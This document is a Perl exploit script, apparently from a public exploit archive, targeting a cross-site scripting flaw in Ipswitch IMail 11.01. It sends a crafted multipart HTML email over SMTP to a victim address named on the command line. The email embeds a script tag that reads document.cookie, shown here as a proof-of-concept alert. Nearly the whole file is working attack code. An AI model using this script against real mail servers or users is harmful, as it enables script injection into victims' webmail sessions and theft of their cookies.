#!/usr/bin/perl
# Exploit Title: Ipswitch IMail 11.01 XSS Vulnerability
# Date: 26-04-2013
# Author: DaOne  aka Mocking Bird
# Vendor Homepage: http://www.ipswitch.com/
# Platform: windows
 
use Net::SMTP;
  
# ARGV Check
if ($#ARGV != 2)
{
    print "\nUSAGE: IMail.pl <Mail Server> <Attacker Email> <VicTim Email>\n";
    exit;
}
  
$host = $ARGV[0];
$attacker = $ARGV[1];
$victim = $ARGV[2];
  
# Config SMTP
$smtp = Net::SMTP->new(  Host => $host,
                        Hello => 'Hello world',
                        Timeout => 30)
or die "Couldn't connect to Mail Server\n";
  
# Attacker and Victim email
$smtp->mail($attacker);
$smtp->to($victim);
  
# Send email
$buffer = "From: XSS\n".
"To: testing\n".
"Subject: testing\n".
"MIME-Version: 1.0\n".
"Content-Type: multipart/mixed;\n".
"    boundary=\"--=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\"\n\n".
"----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019\n".
"Content-Type: text/html;\n".
"charset=\"utf-8\"\n".
"Content-Transfer-Encoding: quoted-printable\n\n".
"XSS\n".
"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n".
"<HTML><BODY>\n".
"<script >alert(document.cookie)</script >\n".
"</BODY></HTML>\n\n".
"----=45145578442838848853975045745715171602582966277178406402638054315034128543847104614337851625097187549984363453814450535441019--";
  
$smtp->data();
$smtp->datasend($buffer);
$smtp->quit();
  
print "Send.\n";
#